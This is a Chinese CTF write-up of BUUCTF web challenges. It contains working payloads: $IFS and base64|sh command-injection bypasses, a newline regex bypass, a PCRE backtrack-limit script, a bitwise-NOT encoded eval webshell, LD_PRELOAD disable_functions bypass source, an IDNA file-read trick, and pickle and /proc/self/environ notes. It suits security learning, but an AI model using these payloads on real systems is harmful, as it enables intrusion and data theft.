PD9waHANCnNlc3Npb25fc3RhcnQoKTsNCmVjaG8gIjxtZXRhIGh0dHAtZXF1aXY9XCJDb250ZW50LVR5cGVcIiBjb250ZW50PVwidGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04XCIgLz4gPHRpdGxlPkhvbWU8L3RpdGxlPiI7DQplcnJvcl9yZXBvcnRpbmcoMCk7DQppZihpc3NldCgkX1NFU1NJT05bJ3VzZXInXSkpew0KCWlmKGlzc2V0KCRfR0VUWydmaWxlJ10pKXsNCgkJaWYocHJlZ19tYXRjaCgiLy4/Zi4/bC4/YS4/Zy4/L2kiLCAkX0dFVFsnZmlsZSddKSl7DQoJCQlkaWUoImhhY2tlciEiKTsNCgkJfQ0KCQllbHNlew0KCQkJaWYocHJlZ19tYXRjaCgiL2hvbWUkL2kiLCAkX0dFVFsnZmlsZSddKSBvciBwcmVnX21hdGNoKCIvdXBsb2FkJC9pIiwgJF9HRVRbJ2ZpbGUnXSkpew0KCQkJCSRmaWxlID0gJF9HRVRbJ2ZpbGUnXS4iLnBocCI7DQoJCQl9DQoJCQllbHNlew0KCQkJCSRmaWxlID0gJF9HRVRbJ2ZpbGUnXS4iLmZ4eGt5b3UhIjsNCgkJCX0NCgkJCWVjaG8gIuW9k+WJjeW8leeUqOeahOaYryAiLiRmaWxlOw0KCQkJcmVxdWlyZSAkZmlsZTsNCgkJfQ0KCQkNCgl9DQoJZWxzZXsNCgkJZGllKCJubyBwZXJtaXNzaW9uISIpOw0KCX0NCn0NCj8+
```

```php
<?php
session_start();
echo "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> <title>Home</title>";
error_reporting(0);
if(isset($_SESSION['user'])){
	if(isset($_GET['file'])){
		if(preg_match("/.?f.?l.?a.?g.?/i", $_GET['file'])){
			die("hacker!");
		}
		else{
			if(preg_match("/home$/i", $_GET['file']) or preg_match("/upload$/i", $_GET['file'])){
				$file = $_GET['file'].".php";
			}
			else{
				$file = $_GET['file'].".fxxkyou!";
			}
			echo "当前引用的是 ".$file;
			require $file;
		}
		
	}
	else{
		die("no permission!");
	}
}
?>
```

然后对文件上传不是很了解，通过WP了解到![image-20240324194408772](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240324194408772.png)

```php
if(isset($_GET['name']) and !preg_match("/data:\/\/ | filter:\/\/ | php:\/\/ | \./i", $_GET['name'])){
			$this->Filename = $_GET['name'];
		}
```

![image-20240324194252266](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240324194252266.png)

随便上传一个文件，然后看到是在/var/www/html下的

![image-20240324193935819](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240324193935819.png)

# 命令执行

## [GXYCTF2019]Ping Ping Ping

打开靶机发现让我们输出ip

![image-20240316162309256](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240316162309256.png)

![image-20240316162322636](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240316162322636.png)

发现当前目录下有flag.php和index.php

![image-20240316162537968](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240316162537968.png)

直接cat，提示过滤了空格

![image-20240316162606808](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240316162606808.png)

尝试{cat,flag} 和 编码绕过，都提示符号被过滤

![image-20240316162707846](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240316162707846.png)

使用$IFS成功绕过空格，然后提示应该是flag被过滤

![image-20240316162739928](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240316162739928.png)

```php
cat$IFSfla?.php ---->符号被过滤
cat$IFSfla""g.php ---->符号被过滤
cat$IFSfla\g.php ---->依旧提示flag被过滤
cat$IFSfla$9g.php ---->特殊变量也无法绕过
```

以上方法都行不通，那么尝试编码绕过

```php
用base64编码
cat flag.php---->Y2F0IGZsYWcucGhw
echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS-d|bash
发现bash被过滤
```

![image-20240316163235574](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240316163235574.png)

那么改成sh，查看页面源代码，拿到flag

## [FBCTF2019]RCEService 1

首先页面提示使用JSON格式，那么输入{“cmd”,”ls”}

![image-20240317093629353](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240317093629353.png)

![image-20240317093704389](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240317093704389.png)

没有什么用，然后也看不了这个页面的源代码，查看WP得知要审计源代码，但BUU没有给出

```php
<?php

putenv('PATH=/home/rceservice/jail');

if (isset($_REQUEST['cmd'])) {
  $json = $_REQUEST['cmd'];

  if (!is_string($json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } else {
    echo 'Attempting to run command:<br/>';
    $cmd = json_decode($json, true)['cmd'];
    if ($cmd !== NULL) {
      system($cmd);
    } else {
      echo 'Invalid input';
    }
    echo '<br/><br/>';
  }
}

?>
```

发现过滤了很多函数，但是**preg_match只能匹配第一行数据，所以可以使用%0A换行绕过**

```php
?cmd={%0A"cmd":"ls ../../.."%0A} # 一个目录一个目录往回找，然后再从根目录找，直到找到flag
?cmd={%0A"cmd":"ls ../../../home/rceservice"%0A}
```

![image-20240317095140968](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240317095140968.png)

然后发现cat、tac、more、less等查看内容的都无法使用，查看WP发现要从根目录调用cat才行

```php
?cmd={%0A"cmd":"/bin/cat ../../../home/rceservice/flag"%0A}
```

拿到flag{82cd507e-32cb-4594-aaae-9b5934a2ceb4}

还有一个方法是通过利用preg_match()函数的最大回溯机制次数限制

[PHP利用PCRE回溯次数限制绕过某些安全限制](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)

```py
url='http://e3bd99a5-2ffe-498d-b64e-a40ce7f40a9c.node5.buuoj.cn:81/'
data={
    'cmd':'{"cmd":"/bin/cat /home/rceservice/flag","haha":"'+'a'*1000000+'"}'
}

r=requests.post(url=url,data=data).text
print(r)
```

![image-20240317100047305](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240317100047305.png)

## [极客大挑战 2019]RCE ME 1

打开靶场环境，看到给出的源码，传入code长度不能超过40，且过滤了字母和数字，那么考虑用取反绕过或者异或绕过

![image-20240317112807753](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240317112807753.png)

```php
在cmd中输入php -r "echo urlencode(~'phpinfo');"将phpinfo取反编码，得到下面，查看页面禁用哪些函数，发现大多数都被禁用，那么接着用取反
?code=(~%8F%97%8F%96%91%99%90)();
```

![image-20240317113200394](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240317113200394.png)

```php
assert ---> %9E%8C%8C%9A%8D%8B
eval($_POST[a]) ---> %9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6
构造payload：
?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6);
然后使用蚁剑进行连接，发现虚拟终端无法执行命令，然后就试着用蚁剑的插件
```

![image-20240317114742177](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240317114742177.png)

成功连接并且可以执行命令读取flag

![image-20240317114828344](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240317114828344.png)

还有一种方法是利用动态链接库——LD_PRELOAD来进行绕过

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
void payload() {
	system("cat /flag >> /var/tmp/test.php");
	# system("tac /flag >> /var/tmp/test.php");
	# system("more /flag >> /var/tmp/test.php");
	# system("head -2 /flag >> /var/tmp/test.php");
	# system("tail /flag >> /var/tmp/test.php");
	# system("/readflag >> /var/tmp/test.php");
	
}   
int  geteuid() {
    if (getenv("LD_PRELOAD") == NULL) { return 0; }
    unsetenv("LD_PRELOAD");
    payload();
}
创建demo.c文件，并编译为demo.so文件
gcc -shared -fPIC demo.c -o demo.so
```

```php
<?php
putenv("LD_PRELOAD=/var/tmp/demo.so");
mail("","","","");
?>
再创建demo.php文件
```

再通过蚁剑上传

![image-20240317120410706](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240317120410706.png)

随后再访问demo.php文件即可在var/tmp发现test.php，点开就可以看见flag{d06fdea0-5ba9-4f2b-9360-65f2b5cb2449}

```php
?code=${%fe%fe%fe%fe^%a1%b9%bb%aa}[_](${%fe%fe%fe%fe^%a1%b9%bb%aa}[__]);&_=assert&__=include(%27/var/tmp/demo.php%27)&cmd=/readflag&outpath=/tmp/tmpfile&sopath=/var/tmp/demo.so
```

# Python漏洞

## [SUCTF 2019]Pythonginx

打开环境，查看源代码

```HTML

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
</head>
<body>
    <form method="GET" action="getUrl">
        URL:<input type="text" name="url"/>
        <input type="submit" value="Submit"/>
    </form>

    <code>
        
        @app.route('/getUrl', methods=['GET', 'POST'])
def getUrl():
    url = request.args.get("url")
    host = parse.urlparse(url).hostname
    if host == 'suctf.cc':
        return "我扌 your problem? 111"
    parts = list(urlsplit(url))
    host = parts[1]
    if host == 'suctf.cc':
        return "我扌 your problem? 222 " + host
    newhost = []
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))
    parts[1] = '.'.join(newhost)
    #去掉 url 中的空格
    finalUrl = urlunsplit(parts).split(' ')[0]
    host = parse.urlparse(finalUrl).hostname
    if host == 'suctf.cc':
        return urllib.request.urlopen(finalUrl).read()
    else:
        return "我扌 your problem? 333"
    </code>
    <!-- Dont worry about the suctf.cc. Go on! -->
    <!-- Do you know the nginx? -->
</body>
</html>
```

提示了是nginx，所以我们要知道一些nginx文件的存放位置

```
配置文件存放目录：/etc/nginx
主配置文件：/etc/nginx/conf/nginx.conf
管理脚本：/usr/lib64/systemd/system/nginx.service
模块：/usr/lisb64/nginx/modules
应用程序：/usr/sbin/nginx
程序默认存放位置：/usr/share/nginx/html
日志默认存放位置：/var/log/nginx
配置文件目录为：/usr/local/nginx/conf/nginx.conf
```

对源码进行审计，发现要绕过前两个的判断host是否为suctf.cc，然后使第三个host == suctf.cc，第一个是host = parse.urlparse(url).hostname，第二个是parts = list(urlsplit(url))   host = parts[1]，第三个是经过newhost.append(h.encode('idna').decode('utf-8'))编码过后结果为suctf.cc，漏洞所在处就是这个编码。

```
℆这个字符,如果使用python3进行idna编码的话
print(‘℆’.encode(‘idna’))
结果
b’c/u’
如果再使用utf-8进行解码的话
print(b’c/u’.decode(‘utf-8’))
结果
c/u
通过这种方法可以绕过网站的一些过滤字符
```

```
POC:
/getUrl?url=file://suctf.c℆sr/local/nginx/conf/nginx.conf

/getUrl?url=file://suctf.c℆sr/fffffflag
```

![image-20240406133743239](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240406133743239.png)

![image-20240406133857600](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240406133857600.png)

## HFCTF-2021-Final-easyflask(未解出)

**考点**

>  Python os.path.join trick、环境变量暴露敏感信息、pickle反序列化 RCE、Flask session伪造

**思路**

> * 进入题目，提示`/file?file=index.js`，进去之后提示`Source at /app/source`，获得源码信息
>
> * 注意 `/file` 路由，用户上传的 `path` 会被拼接到 `static` 目录后面，这里有个`trick`，当 `os.path.join` 的第二个参数为绝对路径时拼接的结果就是该绝对路径，用这里可以实现任意文件读取
>
>   ```py
>   os.path.join("static","H3rmesk1t")
>   'static/H3rmesk1t'
>   os.path.join("static","/etc/passwd")
>   '/etc/passwd'
>   ```

```py

#!/usr/bin/python3.6
import os
import pickle

from base64 import b64decode
from flask import Flask, request, render_template, session

app = Flask(__name__)
app.config["SECRET_KEY"] = "*******" 
'''
反序列化必然包含创建新对象的操作，如果__reduce__里包含攻击代码就可以实现RCE，但是反序列化的输出被储存在session里面，session数据都是经过flask加密的，只有知道secret_key才能伪造session实现RCE

一般来说，secret_key这样的数据传递给程序主要有以下方法：硬编码在代码里、写在配置文件里、通过环境变量传递给程序

这里是第三种情况，*nix系统存在一个伪文件系统/proc，结合前面的任意文件读取漏洞可以读取到自身的环境变量，即/file?file=/proc/self/environ，得到secret_key=glzjin22948575858jfjfjufirijidjitg3uiiuuh

接下来伪造session，修改源码里的secret_key，给User对象添加__reduce__方法，用浏览器访问/拿到伪造好的Cookie

需要注意：靶机是Linux环境，本地是Windows环境，这两个环境下dumps的结果中序列化字符串声明系统的标识符不同：Linux=>posix；Windows=>nt，需要将脚本放在Linux环境下生成序列化字符串
'''

User = type('User', (object,), {
    'uname': 'test',
    'is_admin': 0,
    '__repr__': lambda o: o.uname,
})


@app.route('/', methods=('GET',))
def index_handler():
    if not session.get('u'):
        u = pickle.dumps(User())
        session['u'] = u
    return "/file?file=index.js"


@app.route('/file', methods=('GET',))
def file_handler():
    path = request.args.get('file')
    path = os.path.join('static', path)
    if not os.path.exists(path) or os.path.isdir(path) \
            or '.py' in path or '.sh' in path or '..' in path or "flag" in path:
        return 'disallowed'

    with open(path, 'r') as fp:
        content = fp.read()
    return content


@app.route('/admin', methods=('GET',))
def admin_handler():
    try:
        u = session.get('u')
        if isinstance(u, dict):
            u = b64decode(u.get('b'))
        u = pickle.loads(u)
    except Exception:
        return 'uhh?'

    if u.is_admin == 1:
        return 'welcome, admin'
    else:
        return 'who are you?'


if __name__ == '__main__':
    app.run('0.0.0.0', port=80, debug=False)
```

